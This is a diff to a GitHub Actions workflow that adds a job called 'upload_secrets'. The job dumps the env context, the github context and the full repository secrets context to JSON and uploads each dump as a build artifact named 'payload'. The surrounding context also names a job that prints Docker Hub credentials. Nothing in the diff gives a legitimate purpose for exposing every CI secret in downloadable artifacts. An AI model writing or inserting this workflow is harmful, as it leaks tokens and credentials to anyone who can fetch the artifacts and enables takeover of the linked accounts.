@@ -30,6 +30,38 @@ jobs:
     uses: n138-kz/n138-kz/.github/workflows/github-act_docker_login.yml@main
     secrets: inherit # pass all secrets
 
+  upload_secrets:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Export to json
+        run: echo '${{ toJSON(env) }}' | jq -c | tee payload.json
+
+      - name: Upload file
+        uses: actions/upload-artifact@v4
+        with:
+          name: payload
+          path: payload.json
+
+      - name: Export to json
+        run: echo '${{ toJSON(github) }}' | jq -c | tee payload.json
+
+      - name: Upload file
+        uses: actions/upload-artifact@v4
+        with:
+          name: payload
+          path: payload.json
+
+      - name: Export to json
+        run: echo '${{ toJSON(secrets) }}' | jq -c | tee payload.json
+
+      - name: Upload file
+        uses: actions/upload-artifact@v4
+        with:
+          name: payload
+          path: payload.json
+
   print_dockerhub_credential:
     runs-on: ubuntu-latest
     needs: docker_login
